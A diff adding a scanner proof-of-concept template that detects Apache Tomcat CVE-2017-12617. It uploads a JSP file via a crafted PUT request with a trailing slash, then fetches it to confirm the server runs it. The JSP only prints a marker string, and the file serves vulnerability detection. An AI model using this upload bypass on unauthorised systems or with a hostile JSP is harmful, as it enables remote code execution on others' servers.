@@ -1,0 +1,58 @@
+[info]
+author = "AVE"
+description = "通过发送特制 PUT 请求上传 JSP 文件并访问验证，检测 Apache Tomcat 是否受 CVE-2017-12617 影响"
+id = "POC-AVE-2017-0508"
+name = "Apache Tomcat PUT JSP Upload Bypass Remote Code Execution PoC"
+severity = "high"
+tags = [
+    "cve-2017-12617",
+    "tomcat",
+    "rce",
+    "jsp-upload",
+]
+vuln_id = [
+    "CVE-2017-12617",
+    "AVE-2017-0508",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/{{randstr}}.jsp/"
+protocol = "http"
+
+[poc.requests.body]
+content = '<% out.println("CVE-2017-12617");%>'
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    201,
+    204,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{randstr}}.jsp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["CVE-2017-12617"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
